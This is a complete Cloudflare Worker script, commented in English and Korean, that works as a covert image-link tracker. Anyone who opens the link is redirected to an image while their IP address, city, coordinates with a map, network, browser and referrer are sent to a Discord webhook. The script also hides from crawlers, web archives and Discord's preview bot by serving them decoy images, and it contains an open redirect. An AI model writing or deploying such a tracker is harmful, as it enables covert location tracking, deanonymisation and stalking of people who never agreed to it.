// Discord webhook URLs per category
// 카테고리별 디스코드 웹훅 URL
const WEBHOOKS = {
  alpha: "https://discord.com/api/webhooks/your_alpha_webhook",   // Category A (고유 추적 A)
  beta: "https://discord.com/api/webhooks/your_beta_webhook",     // Category B (고유 추적 B)
  gamma: "https://discord.com/api/webhooks/your_gamma_webhook",   // Generic fallback (일반용)
};

// Image URLs per category for redirect
// 추적 후 리디렉션할 이미지 URL
const IMAGE_URLS = {
  alpha: "https://example.com/image-a.jpg",  // Alpha image
  beta: "https://example.com/image-b.gif",   // Beta image
  gamma: "https://example.com/image-c.png",  // Gamma image
};

// Embed color for Discord logs
// 디스코드 임베드 색상 (10진수)
const EMBED_COLORS = {
  alpha: 16711680, // red (빨강)
  beta: 255,       // blue (파랑)
  gamma: 32768,    // green (초록)
};

// Embed title text
// 디스코드 임베드 제목
const EMBED_TITLES = {
  alpha: "Alpha Tracker Hit",  // 알파 추적 감지
  beta: "Beta Tracker Hit",    // 베타 추적 감지
  gamma: "Gamma Tracker Hit",  // 감마 추적 감지
};

// Random fallback images for blocked/flagged users
// 차단 대상 또는 위협 사용자에 대한 대체 이미지
const DEC0Y_IMAGES = [
  "https://picsum.photos/600/300",
  "https://placekitten.com/600/300",
  "https://placebear.com/600/300",
  "https://loremflickr.com/600/300/nature",
  "https://dummyimage.com/600x300/000/fff.jpg&text=Access+Denied"
];

// Detect known bots or crawlers from UA
// 봇 또는 크롤러 탐지
function detectBot(userAgent = "") {
  const ua = userAgent.toLowerCase();
  const knownBots = ["bot", "crawl", "slurp", "spider", "archive.org", "wayback", "discordbot"];
  return knownBots.find(bot => ua.includes(bot)) || null;
}

// Determine webhook/image target type from path
// 경로로부터 대상 카테고리 결정
function parseTargetFromPath(url) {
  const path = new URL(url).pathname.toLowerCase();
  if (path.includes("alpha")) return "alpha";
  if (path.includes("beta")) return "beta";
  return "gamma";
}

// Extract tracking label from query param z
// z 파라미터에서 노트값 추출
function getNotesIdentifier(url) {
  const u = new URL(url);
  const val = u.searchParams.get("z");
  return val && val !== "unknown" ? val : null;
}

// Build Geoapify static map image URL
// 정적 지도 이미지 URL 생성 (Geoapify)
function getGeoapifyMapURL(lat, lon) {
  return lat && lon
    ? `https://maps.geoapify.com/v1/staticmap?style=osm-carto&width=800&height=400&center=lonlat:${lon},${lat}&zoom=13&marker=lonlat:${lon},${lat};color:%23ff0000;size:large&scaleFactor=2&lang=en&apiKey=your_geoapify_api_key`
    : null;
}

// Convert ISO country code to emoji flag
// 국가 코드 → 이모지 국기
function getCountryFlag(countryCode) {
  if (!countryCode || countryCode.length !== 2) return "";
  try {
    return String.fromCodePoint(...[...countryCode.toUpperCase()].map(c => 127397 + c.charCodeAt()));
  } catch (e) {
    return "";
  }
}

// Parse and format User-Agent info
// User-Agent 포맷팅
function formatUserAgent(ua = "") {
  if (!ua) return "`Unknown`";
  try {
    const osMatch = ua.match(/\(([^)]+)\)/);
    const browserMatch = ua.match(/(Firefox|Chrome|Safari|Edge|Opera)[/ ]([\d.]+)/);
    const os = osMatch ? osMatch[1] : null;
    const browser = browserMatch ? `${browserMatch[1]} ${browserMatch[2]}` : null;

    const lowerUA = ua.toLowerCase();
    let device = "Desktop";
    if (lowerUA.includes("mobile")) device = "Mobile";
    else if (lowerUA.includes("tablet")) device = "Tablet";
    else if (lowerUA.includes("smarttv") || lowerUA.includes("tv")) device = "TV";

    return browser && os ? `${browser} on ${os} (${device})` : `\`${ua}\``;
  } catch (e) {
    return `\`${ua}\``;
  }
}

// Identify blocked or flagged IP sources
// 위협 또는 차단된 사용자 여부 판단
function isSuspicious(cf, bot) {
  const badCountries = ["RU", "CN"];
  return bot || badCountries.includes(cf.country);
}

// Build footer string based on detected threat
// 위협 유형별 푸터 생성
function getThreatFooter(cf, bot) {
  if (bot) return "⚠️ Crawler Detected";
  if (["RU", "CN"].includes(cf.country)) return "⚠️ RU/CN User Detected";
  if (cf.botManagement?.corporateProxy) return "⚠️ VPN/Proxy Detected";
  return null;
}

// Main request handler for Cloudflare Worker
// Cloudflare Worker의 메인 요청 핸들러
export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const target = parseTargetFromPath(url.href);
    const webhook = WEBHOOKS[target];
    const fallbackURL = IMAGE_URLS[target];
    const color = EMBED_COLORS[target];
    const title = EMBED_TITLES[target];

    const userAgent = request.headers.get("user-agent") || "";
    const ip = request.headers.get("cf-connecting-ip") || "?";
    const ref = request.headers.get("referer") || null;
    const notes = getNotesIdentifier(url.href);
    const cf = request.cf || {};
    const unix = Math.floor(Date.now() / 1000);
    const bot = detectBot(userAgent);
    const isThreat = isSuspicious(cf, bot);
    const redirectParam = url.searchParams.get("r");
    const forceDownload = url.searchParams.get("dl") === "1";

    // Determine final image URL for redirect
    // 최종 리디렉션 URL 결정
    let finalURL = fallbackURL;
    if (redirectParam && redirectParam.startsWith("https://")) {
      finalURL = redirectParam;
    }
    if (isThreat) {
      const i = Math.floor(Math.random() * DEC0Y_IMAGES.length);
      finalURL = DEC0Y_IMAGES[i];
    }

    // Set response headers
    // 응답 헤더 설정
    const headers = new Headers({ "Cache-Control": "no-store" });
    if (forceDownload) headers.set("Content-Disposition", "attachment");

    const response = Response.redirect(finalURL, 302);
    response.headers.forEach((v, k) => headers.set(k, v));

    // Log hit to Discord
    // 디스코드에 추적 정보 전송
    ctx.waitUntil((async () => {
      const fields = [];

      fields.push({ name: "IP Address", value: `\`${ip}\``, inline: true });
      fields.push({ name: "User-Agent", value: formatUserAgent(userAgent), inline: false });
      if (ref) fields.push({ name: "Referrer", value: `\`${ref}\``, inline: false });

      if (cf.asn) {
        const asnText = `AS${cf.asn}`;
        fields.push({ name: "ASN", value: `[${asnText}](https://bgp.he.net/${asnText})`, inline: true });
      }

      if (cf.city || cf.region || cf.country) {
        const locationText = `${cf.city || "?"}, ${cf.region || "?"}, ${cf.country || "?"} ${getCountryFlag(cf.country)}`;
        fields.push({ name: "Location", value: locationText, inline: true });
      }

      if (bot) fields.push({ name: "Bot Detection", value: bot, inline: true });
      if (notes) fields.push({ name: "Notes", value: notes, inline: true });
      fields.push({ name: "Intercepted", value: `<t:${unix}>`, inline: true });

      const footerText = getThreatFooter(cf, bot);
      const mapImage = getGeoapifyMapURL(cf.latitude, cf.longitude);

      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [
            {
              title,
              color,
              fields,
              image: mapImage ? { url: mapImage } : undefined,
              footer: footerText ? { text: footerText } : undefined,
            },
          ],
        }),
      });
    })());

    return new Response(null, {
      status: 302,
      headers,
    });
  },
};
